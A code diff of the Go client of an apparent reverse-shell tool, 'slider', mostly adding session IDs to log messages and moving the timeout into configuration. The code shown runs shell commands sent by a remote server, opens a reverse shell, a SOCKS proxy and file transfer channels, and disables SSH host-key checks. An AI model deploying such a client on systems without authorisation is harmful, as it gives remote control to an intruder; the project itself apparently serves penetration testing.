@@ -85,7 +85,8 @@ func NewClient(args []string) {
 	}
 
 	log := slog.NewLogger("Client")
-	if lvErr := log.SetLevel(*verbose); lvErr != nil {
+	lvErr := log.SetLevel(*verbose)
+	if lvErr != nil {
 		fmt.Printf("%s", lvErr)
 		return
 	}
@@ -107,7 +108,7 @@ func NewClient(args []string) {
 	c.sshConfig = &ssh.ClientConfig{
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		ClientVersion:   "SSH-slider-client",
-		Timeout:         60 * time.Second,
+		Timeout:         conf.Timeout,
 	}
 
 	if *key != "" {
@@ -148,7 +149,7 @@ func NewClient(args []string) {
 		}()
 	} else {
 		c.serverAddr = clientFlags.Args()[0]
-		c.wsConfig = conf.NewWebSocketDialer()
+		c.wsConfig = conf.DefaultWebSocketDialer
 		wsConn, _, wErr := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
 		if wErr != nil {
 			c.Fatalf("Can't connect to Server address: %s", wErr)
@@ -186,8 +187,8 @@ func (c *client) newSSHClient(session *Session) {
 		return
 	}
 	defer func() { _ = session.sshConn.Close() }()
-	c.Infof("Server connected (%s)...", session.wsConn.RemoteAddr().String())
-	c.Debugf("Session %v\n", session.sshConn.SessionID())
+	c.Infof("Server connected (%s)", session.wsConn.RemoteAddr().String())
+	c.Debugf("%sSSH Session %v\n", session.logID, session.sshConn.SessionID())
 
 	// Send Interpreter Information to Server
 	clientInfo, cErr := newClientInfo()
@@ -261,7 +262,7 @@ func (s *Session) sendClientInfo(ci *conf.ClientInfo) {
 	clientInfoBytes, _ := json.Marshal(ci)
 	ok, _, sErr := s.sshConn.SendRequest("client-info", true, clientInfoBytes)
 	if sErr != nil || !ok {
-		s.Errorf("client information was not sent to server - %v", sErr)
+		s.Errorf("%sclient information was not sent to server - %v", s.logID, sErr)
 	}
 }
 
@@ -269,18 +270,19 @@ func (s *Session) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
 	for nc := range newChan {
 		switch nc.ChannelType() {
 		case "socks5":
-			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
+			s.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
 			go s.handleSocksChannel(nc)
 		case "file-upload":
-			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
+			s.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
 			go s.handleFileUploadChannel(nc)
 		case "file-download":
-			s.Debugf("Opening \"%s\" channel", nc.ChannelType())
+			s.Debugf("%sOpening \"%s\" channel", s.logID, nc.ChannelType())
 			go s.handleFileDownloadChannel(nc)
 		default:
-			s.Debugf("Rejected channel %s", nc.ChannelType())
+			s.Debugf("%sRejected channel %s", s.logID, nc.ChannelType())
 			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
-				s.Warnf("Received Unknown channel type \"%s\" - %s",
+				s.Warnf("%sReceived Unknown channel type \"%s\" - %s",
+					s.logID,
 					nc.ChannelType(),
 					rErr,
 				)
@@ -294,18 +296,18 @@ func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
 		switch req.Type {
 		case "keep-alive":
 			if err := s.replyConnRequest(req, true, []byte("pong")); err != nil {
-				s.Errorf("Error sending \"%s\" reply to Server - %v", req.Type, err)
+				s.Errorf("%sError sending \"%s\" reply to Server - %v", s.logID, req.Type, err)
 			}
 		case "session-exec":
-			s.Debugf("Received \"%s\" Connection Request", req.Type)
+			s.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
 			go s.sendCommandExec(req)
 		case "session-shell":
-			s.Debugf("Received \"%s\" Connection Request", req.Type)
+			s.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
 			go s.sendReverseShell(req)
 		case "window-change":
 			// Server only sends this Request if Interpreter is PTY
 			// after Reverse Shell is sent, ergo PTY File has been created
-			s.Debugf("Server Requested window change: %s\n", req.Payload)
+			s.Debugf("%sServer Requested window change: %s\n", s.logID, req.Payload)
 			var termSize interpreter.TermSize
 			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
 				s.Fatalf("%s", err)
@@ -314,11 +316,11 @@ func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
 		case "checksum-verify":
 			go s.verifyFileCheckSum(req)
 		case "disconnect":
-			s.Warnf("Server requested Client disconnection.")
+			s.Warnf("%sServer requested Client disconnection.", s.logID)
 			_ = s.replyConnRequest(req, true, []byte("disconnected"))
 			s.disconnect <- true
 		default:
-			s.Debugf("Received unknown Connection Request Type: \"%s\"", req.Type)
+			s.Debugf("%sReceived unknown Connection Request Type: \"%s\"", s.logID, req.Type)
 			_ = req.Reply(false, nil)
 		}
 	}
@@ -327,25 +329,25 @@ func (s *Session) handleGlobalRequests(requests <-chan *ssh.Request) {
 func (s *Session) sendCommandExec(request *ssh.Request) {
 	channel, _, openErr := s.sshConn.OpenChannel("session", nil)
 	if openErr != nil {
-		s.Errorf("failed to open a \"session\" channel to server")
+		s.Errorf("%sFailed to open a \"session\" channel to server", s.logID)
 		return
 	}
 	defer func() { _ = channel.Close() }()
 
 	rcvCmd := string(request.Payload)
-	s.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)
+	s.Debugf("%sReceived Bytes Payload: %v, Command: \"%s\"", s.logID, request.Payload, rcvCmd)
 
 	cmd := exec.Command(s.interpreter.Shell, append(s.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec
 
 	out, _ := cmd.CombinedOutput()
 	_, cwErr := channel.Write(out)
 	if cwErr != nil {
-		s.Errorf("failed to write command \"%s\" output into channel", rcvCmd)
+		s.Errorf("%sFailed to write command \"%s\" output into channel", s.logID, rcvCmd)
 	}
 
 	// Notify Server we are good to go
 	if err := s.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
-		s.Errorf("failed to send reply to request \"%s\"", request.Type)
+		s.Errorf("%sFailed to send reply to request \"%s\"", s.logID, request.Type)
 	}
 }
 
@@ -356,12 +358,12 @@ func (s *Session) keepAlive(keepalive time.Duration) {
 	for {
 		select {
 		case <-s.disconnect:
-			s.Infof("Disconnecting from Server %s...", s.wsConn.RemoteAddr().String())
+			s.Infof("%sDisconnecting from Server %s...", s.logID, s.wsConn.RemoteAddr().String())
 			return
 		case <-ticker.C:
 			_, p, sendErr := s.sendConnRequest("keep-alive", true, []byte("ping"))
 			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
-				s.Errorf("KeepAlive Check Lost connection to Server.")
+				s.Errorf("%sKeepAlive Check Lost connection to Server.", s.logID)
 				s.disconnect <- true
 			}
 		}
@@ -369,12 +371,12 @@ func (s *Session) keepAlive(keepalive time.Duration) {
 }
 
 func (s *Session) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
-	s.Debugf("Sending Connection Request Type \"%s\" with Payload: \"%s\"", reqType, payload)
+	s.Debugf("%sSending Connection Request Type \"%s\" with Payload: \"%s\"", s.logID, reqType, payload)
 	return s.sshConn.SendRequest(reqType, wantReply, payload)
 }
 
 func (s *Session) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
-	s.Debugf("Replying Connection Request Type \"%s\" with Payload: \"%s\"", req.Type, payload)
+	s.Debugf("%sReplying Connection Request Type \"%s\" with Payload: \"%s\"", s.logID, req.Type, payload)
 	return req.Reply(reply, payload)
 }
 
@@ -383,7 +385,7 @@ func (s *Session) sendSessionRequest(sshSession *ssh.Session, requestType string
 	if err != nil {
 		return fmt.Errorf("%s %v", requestType, err)
 	}
-	s.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
+	s.Debugf("%sSent Session Request \"%s\", received: \"%v\" from server.\n", s.logID, requestType, okR)
 	return nil
 }
 
@@ -391,7 +393,8 @@ func (s *Session) handleSocksChannel(channel ssh.NewChannel) {
 	socksChan, req, aErr := channel.Accept()
 	if aErr != nil {
 		s.Errorf(
-			"Failed to accept \"%s\" channel\n%v",
+			"%sFailed to accept \"%s\" channel\n%v",
+			s.logID,
 			channel.ChannelType(),
 			aErr,
 		)
@@ -408,7 +411,7 @@ func (s *Session) handleSocksChannel(channel ssh.NewChannel) {
 	s.socksInstance = ssocks.New(config)
 
 	if err := s.socksInstance.StartServer(); err != nil {
-		s.Debugf("SOCKS - %s", err)
+		s.Debugf("%s(Socks) - %s", s.logID, err)
 	}
 }
 
@@ -416,7 +419,8 @@ func (s *Session) handleFileUploadChannel(channel ssh.NewChannel) {
 	uploadChan, requests, aErr := channel.Accept()
 	if aErr != nil {
 		s.Errorf(
-			"Failed to accept \"%s\" channel\n%v",
+			"%sFailed to accept \"%s\" channel\n%v",
+			s.logID,
 			channel.ChannelType(),
 			aErr,
 		)
@@ -437,7 +441,7 @@ func (s *Session) handleFileUploadChannel(channel ssh.NewChannel) {
 
 func (s *Session) verifyFileCheckSum(req *ssh.Request) {
 	var fileInfo sio.FileInfo
-	s.Debugf("Received \"%s\" Connection Request", req.Type)
+	s.Debugf("%sReceived \"%s\" Connection Request", s.logID, req.Type)
 	if err := json.Unmarshal(req.Payload, &fileInfo); err != nil {
 		_ = req.Reply(false, []byte("failed to unmarshal file info"))
 	}
@@ -459,7 +463,8 @@ func (s *Session) handleFileDownloadChannel(channel ssh.NewChannel) {
 	downloadChan, _, aErr := channel.Accept()
 	if aErr != nil {
 		s.Errorf(
-			"Failed to accept \"%s\" channel\n%v",
+			"%sFailed to accept \"%s\" channel\n%v",
+			s.logID,
 			channel.ChannelType(),
 			aErr,
 		)
